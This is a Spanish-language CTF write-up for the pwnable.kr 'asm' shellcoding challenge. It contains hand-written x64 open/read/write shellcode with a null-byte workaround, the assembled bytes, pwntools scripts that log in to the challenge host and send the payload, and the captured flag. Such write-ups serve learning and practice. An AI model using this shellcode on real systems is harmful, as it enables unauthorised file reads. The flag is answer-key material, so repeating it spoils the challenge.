# asm

![asm](https://github.com/user-attachments/assets/56828f21-9939-4c9c-acb2-46be154e448d)

### Solucion con un shellcode manual

``` asm
BITS 64
; shellcode.asm
call _readfile
db "this_is_pwnable.kr_flag_file_please_read_this_file.sorry_the_file_name_is_very_loooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooo0000000000000000000000000ooooooooooooooooooooooo000000000000o0o0o0o0o0o0ong", 0

_readfile:
; "open" file
  pop rdi ; apuntar al nombre del archivo
  xor rax, rax
  add al, 2    ; syscall "open" (2)
  xor rsi, rsi ; O_RDONLY
  syscall

; "read" file
  sub sp, 0xfff   ; reservar espacio en la pila
  lea rsi, [rsp]  ; apuntar al tope de la pila
  mov rdi, rax    ; fd de open a read   
  xor rdx, rdx    
  mov dx, 0xfff   ; numero de bytes a leer
  xor rax, rax    ; syscall "read" (0)
  syscall

; "write" to stdout
  xor rdi, rdi
  add dil, 1      ; fd "stdout" (1)
  mov rdx, rax    ; numero de bytes a escribir
  xor rax, rax    
  add al, 1       ; syscall "write" (1)
  syscall

; exit
  mov rax,60      ; syscall "exit" (60)
  xor rdi,rdi     ; exit(0)
  syscall
```

**Nota**: Tener en cuenta que a veces esto de `db "string",0` puede resultar fatal por el NULL BYTE del final, funciones que leen strings en C terminan cuando encuentran un NULL BYTE, asi que a veces puede que no se lea completamente el shellcode. Solucion a esto es agregar un caracter no nulo al final de la cadena y reemplazarlo con una instruccion antes de las syscalls:
``` asm
 ;db "this_is_pwnable.kr_flag_file_please_read_this_file.sorry_th
    e_file_name_is_very_looooooooooooooooooooooooooooooooooooooooooo    ooooooooooooooooooooooooooooooooo0000000000000000000000000oooooo    ooooooooooooooooo000000000000o0o0o0o0o0o0ongA"

_readfile:
; "open" file
  pop rdi ; apuntar al nombre del archivo
  xor byte [rdi+231],0x41 ; Aqui reemplazamos 'A' por '\x00'
  xor rax, rax
  add al, 2    ; syscall "open" (2)
  xor rsi, rsi ; O_RDONLY
  syscall
```

Ensamblamos esto con `nasm shellcode.asm` y vemos los bytes en el formato de cadena formateada con `xxd -p | tr -d '\n' | sed 's/\(..\)/\\x\1/g'`:
```
 xxd -p shellcode | tr -d '\n' | sed 's/\(..\)/\\x\1/g'
\xeb\x42\x5f\x80\xb7\xe7\x00\x00\x00\x41\x48\x31\xc0\x04\x02\x48\x31\xf6\x0f\x05\x66\x81\xec\xff\x0f\x48\x8d\x34\x24\x48\x89\xc7\x48\x31\xd2\x66\xba\xff\x0f\x48\x31\xc0\x0f\x05\x48\x31\xff\x40\x80\xc7\x01\x48\x89\xc2\x48\x31\xc0\x04\x01\x0f\x05\x48\x31\xc0\x04\x3c\x0f\x05\xe8\xb9\xff\xff\xff\x74\x68\x69\x73\x5f\x69\x73\x5f\x70\x77\x6e\x61\x62\x6c\x65\x2e\x6b\x72\x5f\x66\x6c\x61\x67\x5f\x66\x69\x6c\x65\x5f\x70\x6c\x65\x61\x73\x65\x5f\x72\x65\x61\x64\x5f\x74\x68\x69\x73\x5f\x66\x69\x6c\x65\x2e\x73\x6f\x72\x72\x79\x5f\x74\x68\x65\x5f\x66\x69\x6c\x65\x5f\x6e\x61\x6d\x65\x5f\x69\x73\x5f\x76\x65\x72\x79\x5f\x6c\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x6f\x30\x6f\x30\x6f\x30\x6f\x30\x6f\x30\x6f\x30\x6f\x6e\x67\x41 
```

En python con pwntools nos conectamos, enviamos el shellcode y obtenemos la flag:
``` python
from pwn import *

sh =  connection = ssh('asm','pwnable.kr',password='guest',port=2222)
io = sh.process(["nc","0.0.0.0","9026"])
shellcode = b"\xe8\xe8\x00\x00\x00\x74\x68\x69\x73\x5f\x69\x73\x5f\x70\x77\x6e\x61\x62\x6c\x65\x2e\x6b\x72\x5f\x66\x6c\x61\x67\x5f\x66\x69\x6c\x65\x5f\x70\x6c\x65\x61\x73\x65\x5f\x72\x65\x61\x64\x5f\x74\x68\x69\x73\x5f\x66\x69\x6c\x65\x2e\x73\x6f\x72\x72\x79\x5f\x74\x68\x65\x5f\x66\x69\x6c\x65\x5f\x6e\x61\x6d\x65\x5f\x69\x73\x5f\x76\x65\x72\x79\x5f\x6c\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x6f\x30\x6f\x30\x6f\x30\x6f\x30\x6f\x30\x6f\x30\x6f\x6e\x67\x00\x5f\x48\x31\xc0\x04\x02\x48\x31\xf6\x0f\x05\x66\x81\xec\xff\x0f\x48\x8d\x34\x24\x48\x89\xc7\x48\x31\xd2\x66\xba\xff\x0f\x48\x31\xc0\x0f\x05\x48\x31\xff\x40\x80\xc7\x01\x48\x89\xc2\x48\x31\xc0\x04\x01\x0f\x05\xb8\x3c\x00\x00\x00\x48\x31\xff\x0f\x05"
print(io.recv().decode())
io.sendline(shellcode)
io.interactive()
```

```
└─$ python3 s.py
[+] Connecting to pwnable.kr on port 2222: Done
[*] asm@pwnable.kr:
    Distro    Ubuntu 22.04
    OS:       linux
    Arch:     amd64
    Version:  5.15.0
    ASLR:     Enabled
    SHSTK:    Disabled
    IBT:      Disabled
[+] Starting remote process None on pwnable.kr: pid 467242
[!] ASLR is disabled for '/usr/bin/nc.openbsd'!
Welcome to shellcoding practice challenge.
In this challenge, you can run your x64 shellcode under SECCOMP sandbox.
Try to make shellcode that spits flag using open()/read()/write() systemcalls only.
If this does not challenge you. you should play 'asg' challenge :)
give me your x64 shellcode:
[*] Switching to interactive mode
Mak1ng_5helLcodE_i5_veRy_eaSy
$
```

### Solucion usando shellcraft de pwntools
``` python3
from pwn import *

context.arch = "amd64"
context.os = "linux"

sh =  connection = ssh('asm','pwnable.kr',password='guest',port=2222)

fname = "this_is_pwnable.kr_flag_file_please_read_this_file.sorry_the_file_name_is_very_loooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooo0000000000000000000000000ooooooooooooooooooooooo000000000000o0o0o0o0o0o0ong"
shellcode = asm(
         shellcraft.open(fname) +
         shellcraft.read('rax','rsp',70) +
         shellcraft.write(1,'rsp',70) +
         shellcraft.exit(0)
         )

io = sh.process(["nc","0.0.0.0","9026"])
io.sendline(shellcode)
io.interactive()
```

`Mak1ng_5helLcodE_i5_veRy_eaSy`

